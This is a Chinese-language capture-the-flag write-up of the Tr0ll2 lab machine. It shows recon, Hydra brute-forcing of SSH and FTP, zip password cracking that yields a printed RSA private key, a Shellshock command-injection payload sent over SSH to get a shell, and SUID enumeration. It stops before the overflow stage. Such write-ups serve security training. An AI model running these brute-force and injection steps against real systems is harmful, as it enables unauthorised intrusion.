
## 端口扫描

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ sudo nmap -sT --min-rate 9999 192.168.10.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 01:51 EDT
Nmap scan report for 192.168.10.8
Host is up (0.0079s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:B4:6A:5F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ sudo nmap -sT -sCV -O -p21,22,80 192.168.10.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 01:51 EDT
Nmap scan report for 192.168.10.8
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:B4:6A:5F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

┌──(kali㉿kali)-[~/workspace/troll2]
└─$ sudo nmap -sT --script vuln  -p21,22,80 192.168.10.8 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 01:52 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.10.8
Host is up (0.00061s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:B4:6A:5F (VMware)
```

## web渗透

试了一下ftp登录
没有匿名登录哈
那就看80吧

![](images/2024-03-17-13-56-34.png)
看到源码
保存一下信息吧
Tr0ll，VIM
然后看一下图片隐写？

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ steghide info tr0ll_again.jpg
"tr0ll_again.jpg":
  format: jpeg
  capacity: 2.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ stegseek tr0ll_again.jpg     
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.87% (133.3 MB)           
[!] error: Could not find a valid passphrase.
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ exiftool tr0ll_again.jpg 
ExifTool Version Number         : 12.76
File Name                       : tr0ll_again.jpg
Directory                       : .
File Size                       : 77 kB
File Modification Date/Time     : 2014:10:04 04:39:51-04:00
File Access Date/Time           : 2024:03:17 01:57:36-04:00
File Inode Change Date/Time     : 2024:03:17 01:57:18-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 407
Image Height                    : 405
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 407x405
Megapixels                      : 0.165
                                                
```
暂时看不到什么信息嗷
目录扫一下看看吧 

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.10.8/ -x php,txt,rar,sql,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.8/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,rar,sql,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 110]
/robots               (Status: 200) [Size: 346]
/robots.txt           (Status: 200) [Size: 346]
```
![robots.txt](images/2024-03-17-14-02-13.png)
看到一堆目录
```
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

那么就得从这里入手了

![](images/2024-03-17-14-03-35.png)
首先看/noob
就一张图片啊，我没看到啥信息

/nope
/try_harder
not found

/keep_trying是和noob一样的信息
![](images/2024-03-17-14-09-22.png)
下载对比两张图片是相同的

到/dont_bother目录
![/dont_bother](images/2024-03-17-14-13-17.png)
看到还是一样，但是细心的我发现图片大了0.1kb
还是下载下来看信息

还有一个ok_this_is_it目录也有图片

下载到所有图片后strings提取信息
```bash
┌──(kali㉿kali)-[~/workspace/troll2/jpg]
└─$ strings cat_the_troll.jpg.2
JFIF
#3-652-108?QE8<M=01F`GMTV[\[7DcjcXjQY[W
)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
"aq2
\vRH
sdwTi
 aDP
 aDP
\z!$
`aDc
(Q@0S
}}HQ\)
B6F@
T"8V
!\#(
...
...
...
Look Deep within y0ur_self for the answer
```

有张图片最后有信息嗷
应该就是刚才那种与众不同的
提示看看y0ur_self去找answer

那么去看看目录呗
![](images/2024-03-17-14-27-40.png)
一堆密文
![](images/2024-03-17-14-29-21.png)
base64解密，感觉像个密码本啊
去ssh爆破一下？

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ hydra -l Tr0ll -P passwd.txt 192.168.10.8 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-17 02:34:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 73129 login tries (l:1/p:73129), ~4571 tries per task
[DATA] attacking ssh://192.168.10.8:22/
[STATUS] 116.00 tries/min, 116 tries in 00:01h, 73019 to do in 10:30h, 10 active
[STATUS] 72.00 tries/min, 216 tries in 00:03h, 72919 to do in 16:53h, 10 active

```
不太现实

gobuster去爆破目录？
```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ gobuster dir -w passwd.txt -u http://192.168.10.8  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                passwd.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 110]
/robots               (Status: 200) [Size: 346]
Progress: 73129 / 73130 (100.00%)
===============================================================
Finished
```
没有额外结果

想到一开始有ftp端口

那么去爆破一下ftp

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ hydra -l Tr0ll -P passwd.txt 192.168.10.8 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-17 02:41:01
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 73129 login tries (l:1/p:73129), ~4571 tries per task
[DATA] attacking ftp://192.168.10.8:21/
[STATUS] 274.00 tries/min, 274 tries in 00:01h, 72855 to do in 04:26h, 16 active
[STATUS] 272.00 tries/min, 816 tries in 00:03h, 72313 to do in 04:26h, 16 active
[STATUS] 280.00 tries/min, 1960 tries in 00:07h, 71169 to do in 04:15h, 16 active
```

也是基本没戏

他妈的ftp用相同的密码Tr0ll/Tr0ll就进去了

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ftp 192.168.10.8
Connected to 192.168.10.8.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.10.8:kali): Tr0ll
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> ls -la
229 Entering Extended Passive Mode (|||44785|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 04  2014 .
drwxr-xr-x    2 0        0            4096 Oct 04  2014 ..
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> mget lmao.zip
mget lmao.zip [anpqy?]? y
229 Entering Extended Passive Mode (|||65462|).
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
100% |**********************************************************************************************************************************************|  1474      101.39 KiB/s    00:00 ETA
226 Transfer complete.
1474 bytes received in 00:00 (93.64 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ unzip lmao.zip 
Archive:  lmao.zip
[lmao.zip] noob password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: noob                    incorrect password
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ fcrackzip  -u -D -p passwd.txt lmao.zip 


PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ unzip lmao.zip                         
Archive:  lmao.zip
[lmao.zip] noob password: 
  inflating: noob                    
                                                                                                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ls -la
总计 2348
drwxr-xr-x 3 kali kali   4096  3月17日 02:58 .
drwxrwxrwx 3 root root   4096  3月17日 01:50 ..
-rw-r--r-- 1 kali kali 747810  3月17日 02:56 hydra.restore
drwxr-xr-x 2 kali kali   4096  3月17日 02:15 jpg
-rw-r--r-- 1 kali kali   1474 2014年10月 3日 lmao.zip
-rw------- 1 kali kali   1679 2014年10月 4日 noob
-rw-r--r-- 1 kali kali 886137  3月17日 02:33 pass.txt
-rw-r--r-- 1 kali kali 664695  3月17日 02:33 passwd.txt
-rw-r--r-- 1 kali kali  77438 2014年10月 4日 tr0ll_again.jpg
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ cat noob    
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
```

从ftp下载得到压缩包后，zip爆破密码得到私钥

```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ssh -i noob Tr0ll@192.168.10.8 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss   
Tr0ll@192.168.10.8's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Mar 17 00:10:50 2024 from 192.168.10.3
Connection to 192.168.10.8 closed.
                                      
```
用私钥连接还是需要输入密码
用Tr0ll作为密码连一下试试
连一下就断开了

这里密钥的用户其实是noob
用shellshock，在LPE里有写
```bash
┌──(kali㉿kali)-[~/workspace/troll2]
└─$ ssh -i noob noob@192.168.10.8 -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss '() { :;}; /bin/bash'                       
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
whoami
noob
```

```bash
noob@Tr0ll2:~$ find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
<able -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null           
/bin/ls
/home/noob/.bash_history
/home/noob/.ssh/known_hosts
/home/noob/.ssh/authorized_keys
/home/noob/.ssh/id_rsa
/home/noob/.ssh/id_rsa.pub
/home/noob/.cache/motd.legal-displayed
```

```bash
noob@Tr0ll2:~$ find / -perm -u=s -type f 2>/dev/null 
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/umount
/bin/ping
/bin/mount
/bin/fusermount
/bin/ping6
/usr/bin/chfn
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/nothing_to_see_here/choose_wisely/door2/r00t
/nothing_to_see_here/choose_wisely/door3/r00t
/nothing_to_see_here/choose_wisely/door1/**r00t**
```

到这里就结束吧,后面涉及到的是缓冲区溢出了
